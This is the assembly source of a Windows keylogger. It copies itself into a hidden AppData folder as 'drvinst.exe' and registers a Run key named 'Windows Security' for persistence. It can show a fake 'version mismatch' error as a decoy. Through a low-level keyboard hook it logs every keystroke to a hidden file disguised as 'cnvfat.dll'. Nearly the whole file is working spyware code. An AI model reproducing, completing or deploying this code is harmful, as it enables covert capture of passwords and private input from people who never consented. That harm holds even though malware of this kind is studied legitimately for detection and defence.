
includelib \masm64\lib\kernel32.lib
includelib \masm64\lib\user32.lib
includelib \masm64\lib\advapi32.lib
includelib \masm64\lib\wininet.lib
extern MessageBoxA : proc
extern ExitProcess : proc
extern GetModuleFileNameA : proc
extern GetEnvironmentVariableA : proc
extern CreateDirectoryA : proc
extern SetFileAttributesA : proc
extern CopyFileA : proc
extern RegOpenKeyExA : proc
extern RegSetValueExA : proc
extern SetWindowsHookExA : proc
extern GetKeyboardState : proc
extern SetKeyboardState : proc
extern GetKeyState :proc
extern GetForegroundWindow : proc
extern GetMessageA : proc
extern GetAsyncKeyState : proc
extern GetSystemTime : proc
extern GetKeyNameTextA : proc
extern CallNextHookEx : proc
extern CreateFileA : proc
extern GetLastError : proc
extern WriteFile : proc
extern GetKeyState : proc
extern ToAscii : proc
extern VkKeyScanA : proc
WriteConsoleA PROTO
GetStdHandle PROTO



FILE_ATTRIBUTE_HIDDEN equ 2h
FILE_ATTRIBUTE_SYSTEM equ 4h
HKEY_CURRENT_USER equ 80000001h
KEY_SET_VALUE  equ 2h
REG_SZ	equ 1
WH_KEYBOARD equ 2

WH_KEYBOARD_LL equ 13
WM_KEYUP equ 101h
WM_SYSKEYUP equ 105h
VK_CAPITAL equ 14h
VK_LSHIFT equ 0a0h
VK_RSHIFT equ 0a1h
VK_BACK equ 8h
VK_ESCAPE equ 1bh
VK_RETURN equ 0dh
VK_TAB equ 9h
VK_SHIFT equ 10h
WM_KEYUP equ 101h
WM_SYSKEYUP equ 105h
VK_CONTROL equ 11h
VK_LMENU equ 0a4h
VK_TAB equ 9h
VK_RIGHT equ 27h
VK_LEFT equ 25h


.data
	msg				db	'This Software version is too old for this Microsoft Operaiting system ',10,' Please use a more recent version of this The Software',0
	msgtitle		db	'Windows version mismatch',0
	lpFilePath		db	300h dup(?)
	lpFilePathlen	db	0
	lpFilename		db	100h dup(?)
	lpFilenamelen	db	0
	lpAppdata		db	'Appdata',0
	lpTargetpath	db	300h dup(?)
	lpTargetpathlen	db	0
	lpAppdatapath	db	300h dup(?)
	lpFoldername	db	'\win32',0
	lpSubkey		db	'Software\Microsoft\Windows\CurrentVersion\Run', 0
	phkResult		db	8h dup(0)
	lpValueName		db	'Windows Security',0
	keyb			db	600h dup(?)
	lpmas			db	'C:\Users\Yigit\Desktop\mssfeaak',0, 400h dup(0)
	sepkey			db	10h dup (0)
	bytesWritten    DWORD ?
	lplogfilepath	db	300h dup(0)
	lplogfilename	db	'\cnvfat.dll',0
	lpTargetfilename	db	'\drvinst.exe',0
	hfile			dq	0
	lpkeybuffer		db	30h dup(0)
	lpPcname		db	30h dup(0)
	lpKeyState		db	100h dup(0)
	lpascii			db	4h(0)
	biglow			db	0

.code

LowLevelKeyboardProc proc nCode:dword, wParam:dword, lParam:qword
	sub rsp, 20h  

	cmp rdx, WM_KEYUP
	je nexthook
	cmp rdx, WM_SYSKEYUP
	je nexthook
	
	mov r13b, byte ptr[r8]
	mov r14, r8

    cmp r13b, VK_CAPITAL
    je nexthook
    cmp r13b, VK_LSHIFT                                       ;check space optimization against al
    je nexthook
    cmp r13b, VK_RSHIFT
    je nexthook
	cmp r13b, 07h ;limit of mouse
    jl nexthook

	cmp r13b, VK_BACK
    je get_key_name
	cmp r13b, VK_ESCAPE
    je get_key_name
    cmp r13b, VK_RETURN
    je get_key_name
    cmp r13b, VK_TAB
    je get_key_name
	cmp r13b, VK_CONTROL
    je get_key_name
	cmp r13b, VK_LEFT
    je get_key_name
	cmp r13b, VK_RIGHT
    je get_key_name

	jmp lettercase


lettercase:

	lea rbx, lpKeyState
	mov rcx, rbx
	call GetKeyboardState

    mov rcx, VK_CAPITAL
    call GetKeyState
  
    mov byte ptr VK_CAPITAL[rbx], al
	xor rax, rax

    mov rcx, VK_SHIFT
    call GetKeyState
	mov byte ptr VK_SHIFT[rbx], al
	
	sub rsp, 30h
	xor rax, rax
	mov dword ptr 20h[rsp], eax
	lea r9, lpascii
	mov r8, rbx
	mov dl, byte ptr[r14 + 4h]
	mov cl, byte ptr[r14]
	call ToAscii
	add rsp, 30h

	mov r14, 1h
	lea r12, lpascii
	jmp otherpush



get_key_name:
	xor rcx, rcx
	mov cl, byte ptr[r8 + 4h]
	shl rcx, 16
	lea rdx, lpkeybuffer
	mov al, '['
	mov [rdx], al
	inc rdx
	mov r8, 28h
	call GetKeyNameTextA
	lea rdx, lpkeybuffer
	mov r14, rax
	inc r14
	add rdx, r14
	inc r14
	mov al, ']'
	mov [rdx], al
	lea r12, lpkeybuffer
	inc r14
 	jmp otherpush
	


otherpush:
	xor rax, rax
;	push rax
	sub rsp, 40h
	mov qword ptr 20h[rsp], rax
	xor r9, r9
	mov r8, r14
	mov rdx, r12
	lea rax, hfile
	xor rcx, rcx
	mov ecx, dword ptr[rax]
	call WriteFile 
	add rsp, 40h

 nexthook:
	sub rsp, 20h
	mov r9, lParam
	xor r8, r8
	mov r8d, wParam
	xor rdx, rdx
	mov edx, nCode
	xor ecx, ecx
	call CallNextHookEx
	add rsp, 20h
	add rsp, 20h  
	ret

LowLevelKeyboardProc endp

; ---------- START -------------------

start		proc
	sub		rsp, 28h


	

;------------------------------------
	
	xor rcx, rcx
	lea rdx, lpFilePath
	mov r8, 300h; maxlen of filedir
	call GetModuleFileNameA  ; rax len of lpFilepath
	lea r8, lpFilePathlen
	mov [r8], al

	lea rdx, lpFilepath	; write filename to lpFilename
	add rdx, rax
	mov r8b, '\'
	xor rcx,rcx
l1:	dec rdx
	inc rcx
	cmp byte ptr[rdx], r8b
	jne l1
	lea r9, lpFilenamelen
	mov [r9], al
	lea r8, lpFilename
l2:	mov al, byte ptr[rdx]
	mov [r8], al
	inc rdx
	inc r8
	cmp byte ptr[rdx], 0
	jne l2

	lea rcx, lpAppdata
	lea rdx, lpTargetpath
	mov r8, 300h
	call GetEnvironmentVariableA

	lea rcx, lpTargetpath
	lea rdx, lpAppdatapath
l8:	mov al, byte ptr[rcx]
	mov [rdx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l8

	lea rdx, lpFoldername
	dec rcx
l6:
	mov al, byte ptr[rdx]
	mov [rcx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l6
	dec rcx

	lea rdx, lpTargetFilename
l3:
	mov al, byte ptr[rdx]
	mov [rcx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l3

	lea rcx, lpTargetpath
	lea rdx, lpFilePath
l5:	mov al, byte ptr[rdx]
	mov bl, byte ptr[rcx]
	cmp al, 0
	je l60
	inc rdx
	inc rcx
	cmp al, bl
	jne l4
	jmp l5

l4:

	
;------------------------------------

; This will work when u are not in appdata\win32

	lea rdx, lpAppdatapath
l10:
	inc rdx
	mov al, byte ptr[rdx]
	cmp al,0
	jne l10

	lea rcx, lpFoldername
l9:	mov al, byte ptr[rcx]
	mov byte ptr [rdx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l9
	

	lea rcx, lpAppdatapath
	xor rdx, rdx
	call CreateDirectoryA 

	lea rcx, lpAppdatapath
	mov rdx, FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN
	call SetFileAttributesA 

	lea rcx, lpFilepath
	lea rdx, lpTargetpath
	xor r8, r8
	call CopyFileA

	lea rcx, lpTargetpath
	mov rdx, FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN
	call SetFileAttributesA 


	mov rcx, HKEY_CURRENT_USER 
	lea rdx, lpSubkey
	xor r8, r8
	mov r9, KEY_SET_VALUE
	lea r10, phkResult
	mov qword ptr [rsp+20h], r10
	call RegOpenKeyExA	

	lea rdx, lpTargetpath ;get lpTargetpathlen
	xor rcx, rcx
l12:	
	mov al, [rdx]
	inc rcx
	inc rdx
	cmp al, 0
	jne l12
	lea rdx, lpTargetpathlen
	mov [rdx], cx

	

	mov r13b, lpTargetpathlen
	push r13
    lea r13, lpTargetpath
    push r13
	sub rsp, 20h

    mov r9d, REG_SZ
    lea rdx, lpValueName
	lea r8, phkResult
	mov ecx, dword ptr[phkResult]
	xor r8, r8
    call RegSetValueExA

	jmp l60

		;Error messagebox
	xor		r9d, r9d
	add r9d, 10h
	lea		r8, msgtitle
	lea		rdx, msg
	xor		ecx, ecx
	call	MessageBoxA
l60:

;------------------------------------

; There will run after file copied to appdata\win32 and get hidden

;------- create folder--------
	
	lea rcx, lpAppdatapath
	lea rdx, lplogfilepath
	mov byte ptr[rcx], 'C'
l14:
	mov al, byte ptr[rcx]
	mov [rdx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l14

	lea rcx, lplogfilename
	dec rdx

l15:
	mov al, byte ptr[rcx]
	mov [rdx], al
	inc rcx
	inc rdx
	cmp al, 0
	jne l15

	
	
	

;----- Create logfile.txt ----------
	xor rax, rax
	push rax
	mov rax, FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN
	push rax
	mov rax, 4h ; was 1h
	push rax
	sub rsp, 20h
	xor r9, r9
	mov r8, 7h
	mov rdx, 10000000h ; GENERIC_ALL
	lea rcx, lplogfilepath
	call CreateFileA 
	lea r9, hfile
	mov [r9], rax
	mov r9, rax


    xor r9d, r9d
    xor r8d, r8d                                            ; mov r8d, eax
    lea rdx, LowLevelKeyboardProc
    xor ecx, ecx
    mov cl, WH_KEYBOARD_LL
    call SetWindowsHookExA

 
    xor r9d, r9d
    xor r8d, r8d
    xor edx, edx
    lea rcx, keyb                                            ;WARNING MSG in rbx
    call GetMessageA



;------------------------------------
	

	
	xor		rcx, rcx
	call	ExitProcess 
start	endp
end

